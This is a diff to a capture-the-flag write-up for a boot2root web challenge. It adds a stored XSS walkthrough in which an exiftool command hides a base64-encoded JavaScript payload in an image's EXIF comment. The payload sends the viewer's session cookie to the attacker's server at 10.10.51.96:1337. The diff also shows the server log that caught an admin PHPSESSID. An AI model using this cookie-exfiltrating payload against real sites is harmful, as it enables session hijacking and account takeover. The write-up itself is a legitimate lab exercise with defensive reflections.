@@ -45,36 +45,63 @@ https://nissen96.github.io/CTF-writeups/writeups/2022/NC3-CTF-2022/Nissezonen.ht
 
 After a thorough readthrough of the writeups I understood that with the help of XSS, we might be able to steal a session cookie and log in as an admin!
 
-In order to achieve this, we need to Add a malicious payload to the image EXIF metadata and then upload the image to the webapp!
+### Exploitation
+
+In order to achieve this, we need to Add a malicious payload to an image EXIF metadata and then upload the image to the webapp at /portal/upload.php!
+
+In order to edit image metadata, we can use exiftool to add the payload to the image EXIF metadata
+
+The payload we want to add to the image is:
 
 ```bash
-<img src='http://10.10.131.239:1337/hacked.jpg' oNlOaD="eval(atob('base64 encodeded payload here'))">
+<img src='http://My-IP/hacked.jpg' oNlOaD="eval(atob('base64 encodeded payload here'))">
 ```
 
 With the base64 encoded malicious payload:
 
 ```bash
 var cookies = document.cookie ? encodeURIComponent(document.cookie) : 'nothing';
-var my_endpoint = 'http://10.10.131.239:1337/cookie/' + cookies + '.jpg';
+var my_endpoint = 'http://MY-IP:1337/cookie/' + cookies + '.jpg';
 var my_img = '<img src=' + my_endpoint + '>';
 document.write(my_img);
 ```
 
-We can then use exiftool to add the payload to the image EXIF metadata
+The transformation of the payload to base64 and the final exiftool command to add the payload to the image:
 
 ```bash
-echo "var cookies = document.cookie ? encodeURIComponent(document.cookie) : 'nothing'; var my_endpoint = 'http://10.10.131.239:1337/cookie/' + cookies + '.jpg'; var my_img = '<img src=' + my_endpoint + '>'; document.write(my_img);" | base64
+echo "var cookies = document.cookie ? encodeURIComponent(document.cookie) : 'nothing';var my_endpoint = 'http://10.10.51.96:1337/cookie/' + cookies + '.jpg';var my_img = '<img src=' + my_endpoint + '>';document.write(my_img);" | base64
 
-exiftool -comment="<img src='http://10.10.131.239:1337/1.jpg' oNlOaD=\"eval(atob('dmFyIGNvb2tpZXMgPSBkb2N1bWVudC5jb29raWUgPyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSA6ICdub3RoaW5nJzsgdmFyIG15X2VuZHBvaW50ID0gJ2h0dHA6Ly8xMC4xMC4xMzEuMjM5OjEzMzcvY29va2llLycgKyBjb29raWVICsgJy5qcGcnOyB2YXIgbXlfaW1nID0gJzxpbWcgc3JjPScgKyBteV9lbmRwb2ludCArICc+JzsgZG9jdW1lbnQud3JpdGUobXlfaW1nKTsK'))\">" hacked.jpg
+exiftool -comment="<img src='http://10.10.51.96:1337/3.jpg' oNlOaD=\"eval(atob('dmFyIGNvb2tpZXMgPSBkb2N1bWVudC5jb29raWUgPyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSA6ICdub3RoaW5nJzt2YXIgbXlfZW5kcG9pbnQgPSAnaHR0cDovLzEwLjEwLjUxLjk2OjEzMzcvY29va2llLycgKyBjb29raWVzICsgJy5qcGcnO3ZhciBteV9pbWcgPSAnPGltZyBzcmM9JyArIG15X2VuZHBvaW50ICsgJz4nO2RvY3VtZW50LndyaXRlKG15X2ltZyk7Cg=='))\">" 3.jpg
 ```
 
-### Exploitation
+We upload the image to the webapp and refresh the /portal/list.php page in order to execute the evaluation of our evil payload!
 
-### Getting foothold on the webapp
+![Hacked](images/payload.png)
+
+```bash
+python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+
+10.10.20.207 - - [18/Dec/2024 21:58:02] "GET /hacked.jpg HTTP/1.1" 200 -
+10.10.20.207 - - [18/Dec/2024 21:56:01] "GET /cookie/SESSID%3D643a51b9d31a97143f720067886343a883a6b1aabf02ed583dde2af945eb2777%3B%20PHPSESSID%3D643a51b9d31a97143f720067886343a883a6b1aabf02ed583dde2af945eb2777.jpg HTTP/1.1" 404
+
+echo "SESSID%3D643a51b9d31a97143f720067886343a883a6b1aabf02ed583dde2af945eb2777%3B%20PHPSESSID%3D643a51b9d31a97143f720067886343a883a6b1aabf02ed583dde2af945eb2777" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))"
+
+SESSID=643a51b9d31a97143f720067886343a883a6b1aabf02ed583dde2af945eb2777; PHPSESSID=643a51b9d31a97143f720067886343a883a6b1aabf02ed583dde2af945eb2777
+
+```
+
+And voilà, we have stolen the session cookie and can now log in as an admin and visit /portal/admin.php!
+
+![Admin page](images/admin.png)
 
 ### Getting third flag
 
-Thanks to "" we can submit the third flag and move on to [Nisseportalen 4](/nc3/boot2root/nisseportalen-4)!
+It seems a bit of final investigation is needed in order to find the third flag, but after simply testing a few commands in the input box, we get the flag and we can submit the third flag and move on to [Nisseportalen 4](/nc3/boot2root/nisseportalen-4)!
+
+![Admin inputbox](images/inputbox.png)
+
+![Flag](images/flag.png)
 
 ## Flag
 
@@ -83,3 +110,19 @@ NC3{Flag3:N1553D3v_5yn32 DU_F0r7j3N3R_37_fl49}
 ```
 
 ## Reflections and Learnings
+
+### Remember that CTFs may have some history!
+
+Revisiting the challenge description proved invaluable. The reference to past projects like “Dangerzone” and “Nissezonen” hinted at a potential vulnerability to explore, which ultimately led to the discovery of an XSS attack vector by reading through old writeups from previous years NC3 CTFs!
+
+### The Power of Cross-Site Scripting (XSS)
+
+This challenge highlighted how XSS, often considered a low-priority vulnerability, can escalate into serious exploitation when combined with creative payloads. Injecting malicious payloads into image metadata was an innovative application of XSS, which proves why it deserves to be an OWASP top 10.
+
+### EXIF Metadata as an Attack Vector
+
+Using tools like exiftool to inject payloads into image metadata demonstrated how unconventional entry points, such as file metadata, can be exploited to compromise a system.
+
+### Session Hijacking through Cookies
+
+The successful theft of an admin session cookie using an XSS payload emphasized the critical need for secure cookie handling, including using the HttpOnly flag to prevent client-side scripts from accessing cookies!
